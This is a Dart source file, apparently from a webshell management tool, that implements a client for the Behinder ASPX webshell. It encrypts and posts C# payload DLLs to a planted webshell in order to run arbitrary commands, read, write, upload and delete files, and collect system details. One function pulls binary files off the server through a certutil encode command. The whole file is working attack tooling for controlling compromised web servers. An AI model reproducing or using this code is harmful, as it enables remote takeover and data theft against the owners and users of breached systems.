import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;
import 'package:http/http.dart' as http;

import '../core/asset_loader.dart';
import '../core/crypto/behinder_crypto.dart';
import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';

/// ASPX 冰蝎 — 行业标准 6 行 shell，DLL 协议，与原版完全兼容
class AspxBehinderConnector extends ShellConnector {
  AspxBehinderConnector(super.webshell) { currentDir = r'C:\inetpub\wwwroot'; }

  late final http.Client _client = http.Client();
  final Map<String, String> _cookies = {};
  String? _lastPingDiagnostic;

  String get _key => BehinderCrypto.deriveKey(webshell.password);
  enc.Key get _aesKey => enc.Key(Uint8List.fromList(utf8.encode(_key)));
  enc.IV get _aesIv => enc.IV(Uint8List.fromList(utf8.encode(_key)));

  Uint8List _enc(Uint8List p) => Uint8List.fromList(enc.Encrypter(enc.AES(_aesKey, mode: enc.AESMode.cbc)).encryptBytes(p, iv: _aesIv).bytes);
  String? _decBytes(Uint8List d) { try { return utf8.decode(Uint8List.fromList(enc.Encrypter(enc.AES(_aesKey, mode: enc.AESMode.cbc)).decryptBytes(enc.Encrypted(d), iv: _aesIv))); } catch (_) { return null; } }

  void _ck(http.Response r) { final raw = r.headers['set-cookie']; if (raw == null) return; final p = raw.split(';').first.trim(); final eq = p.indexOf('='); if (eq > 0) _cookies[p.substring(0, eq).trim()] = p.substring(eq + 1).trim(); }
  Map<String, String> get _h => { 'Content-Type': 'application/octet-stream', if (_cookies.isNotEmpty) 'Cookie': _cookies.entries.map((e) => '${e.key}=${e.value}').join('; '), };

  static const _dll = 'data/behinder_csharp';

  Future<Uint8List> _load(String name) async {
    final path = '$_dll/$name.b64'; String b64;
    try { b64 = (await loadAssetString(path)).trim(); } catch (_) { try { final f = io.File(path); b64 = await f.exists() ? (await f.readAsString()).trim() : ''; } catch (_) { b64 = ''; } }
    return b64.isEmpty ? Uint8List(0) : Uint8List.fromList(base64.decode(b64));
  }

  String _params(Map<String, String> p) { final sb = StringBuffer(); for (final e in p.entries) { sb.write('${e.key}:${base64.encode(utf8.encode(e.value))},'); } return sb.toString(); }

  Future<String> _send(String dll, Map<String, String> p) async {
    try {
      final d = await _load(dll); if (d.isEmpty) return '[Error] $dll';
      final s = utf8.encode('~~~~~~${_params(p)}');
      final body = _enc(Uint8List(d.length + s.length)..setAll(0, d)..setAll(d.length, s));
      final r = await _client.post(Uri.parse(webshell.url), headers: _h, body: body).timeout(const Duration(seconds: 10));
      _ck(r); if (r.statusCode != 200) return '[HTTP ${r.statusCode}]';
      final dec = _decBytes(r.bodyBytes);
      return dec != null ? BehinderCrypto.extractResponse(dec) : decodeWithFallback(r.bodyBytes);
    } on TimeoutException { return '[Timeout]'; } on http.ClientException catch (e) { return '[Error] ${e.message}'; } catch (e) { return '[Error] $e'; }
  }

  @override Set<ConnectorCapability> get capabilities => const { ConnectorCapability.codeExec, ConnectorCapability.shellExec, ConnectorCapability.fileRead, ConnectorCapability.fileWrite };
  @override String? get lastPingDiagnostic => _lastPingDiagnostic;

  @override Future<bool> ping() async {
    try {
      final r = await _send('Echo', {'content': 'MATRIX_ASPNET_PING'}).timeout(const Duration(seconds: 10));
      if (r.contains('MATRIX_ASPNET_PING')) { _lastPingDiagnostic = null; return true; }
      _lastPingDiagnostic = r; return false;
    } catch (e) { _lastPingDiagnostic = e.toString(); return false; }
  }

  @override Future<String> executeCommand(String cmd, {String workingDir = ''}) async { final c = workingDir.isNotEmpty ? 'cd /d "$workingDir" && $cmd' : cmd; return (await _send('Cmd', {'cmd': c})).trim(); }

  @override Future<String> getCurrentDir() async => currentDir;

  @override Future<List<FileEntry>> listDirectory(String path) async {
    final r = await _send('FileOperation', {'mode': 'list', 'path': path});
    if (r.isEmpty || r.startsWith('[Error') || r.startsWith('[HTTP') || r.startsWith('[Timeout')) return [];
    try { final json = jsonDecode(r); if (json is List) { return json.map((e) { final name = decodeWithFallback(base64.decode((e['name']??'').toString())); final typeB64 = (e['type']??'').toString(); final type = typeB64.isNotEmpty ? decodeWithFallback(base64.decode(typeB64)) : ''; final isDir = type.contains('dir') || type == 'd'; final sizeB64 = (e['size']??'MA==').toString(); final size = int.tryParse(decodeWithFallback(base64.decode(sizeB64)))??0; if (name == '.' || name == '..') return null; return FileEntry(name: name, isDirectory: isDir, size: size, permissions: '', modified: ''); }).whereType<FileEntry>().toList()..sort((a,b)=>a.name.compareTo(b.name)); } } catch (_) {}
    return r.trim().split('\n').where((l)=>l.contains('|')).map((l){final p=l.trim().split('|');if(p.length<4)return null;try{return FileEntry(name:decodeWithFallback(base64.decode(p[0])),isDirectory:p[1]=='d',size:int.tryParse(p[2])??0,permissions:'',modified:p[3]);}catch(_){return null;}}).whereType<FileEntry>().toList()..sort((a,b)=>a.name.compareTo(b.name));
  }

  @override Future<String> readFile(String path) async => (await _send('FileOperation', {'mode': 'download', 'path': path})).trim();
  @override Future<bool> writeFile(String path, String content) async { final r = await _send('FileOperation', {'mode': 'create', 'path': path, 'content': base64.encode(utf8.encode(content))}); return r.isNotEmpty && !r.startsWith('['); }
  @override Future<bool> deleteFile(String path) async { final r = await _send('FileOperation', {'mode': 'delete', 'path': path}); return r.isNotEmpty && !r.startsWith('['); }
  @override Future<Uint8List> readFileBinary(String path) async { final r = await _send('Cmd', {'cmd': 'del "%TEMP%\\mxb64.tmp" >nul 2>nul & certutil -encode "$path" "%TEMP%\\mxb64.tmp" >nul && type "%TEMP%\\mxb64.tmp" && del "%TEMP%\\mxb64.tmp"'}); final lines = r.split('\n'); final b64 = lines.where((l) => l.isNotEmpty && !l.contains('CERTIFICATE') && !l.startsWith('---')).join().trim(); return b64.isEmpty ? Uint8List(0) : Uint8List.fromList(base64.decode(b64)); }
  @override Future<bool> writeFileBinary(String path, Uint8List bytes) async { return writeFileBinaryWithProgress(path, bytes, (_, __) {}); }

  static const _blockSize = 256 * 1024; // 256KB

  @override Future<bool> writeFileBinaryWithProgress(String path, Uint8List bytes, void Function(int, int) p) async {
    final total = bytes.length;
    p(0, total);
    final chunks = <Uint8List>[];
    for (int i = 0; i < total; i += _blockSize) {
      chunks.add(bytes.sublist(i, (i + _blockSize).clamp(0, total)));
    }
    for (int i = 0; i < chunks.length; i++) {
      final mode = i == 0 ? 'create' : 'append';
      final b64 = base64.encode(chunks[i]);
      final r = await _send('FileOperation', {'mode': mode, 'path': path, 'content': b64});
      if (r.isEmpty || r.startsWith('[')) return false;
      final sent = ((i + 1) * _blockSize).clamp(0, total);
      p(sent, total);
    }
    return true;
  }

  @override Future<Map<String, String>> getSystemInfo() async => { 'OS': (await _send('Cmd', {'cmd': 'ver'})).trim(), 'User': (await _send('Cmd', {'cmd': 'whoami'})).trim(), 'Host': (await _send('Cmd', {'cmd': 'hostname'})).trim() };
  @override Future<String> getHomeDir() async => (await _send('Cmd', {'cmd': 'echo %USERPROFILE%'})).trim();
  @override Future<List<String>> listEnvVarNames() async { final r = await _send('Cmd', {'cmd': 'set'}); return r.trim().split('\n').map((l){final e=l.indexOf('=');return e>0?l.substring(0,e).trim():'';}).where((s)=>s.isNotEmpty).toList()..sort(); }
  @override Future<List<({String name, bool isDir})>> listNamesForCompletion(String path) async {
    final r = await _send('Cmd', {'cmd': 'dir /b "$path" 2>nul'});
    final names = <({String name, bool isDir})>[];
    for (final l in r.trim().split('\n')) {
      final name = l.trim();
      if (name.isNotEmpty && name != '.' && name != '..') names.add((name: name, isDir: false));
    }
    return names..sort((a, b) => a.name.compareTo(b.name));
  }
  @override Future<void> startReverseShell(String lhost, int lport, {bool preferScript=true}) async {}
}
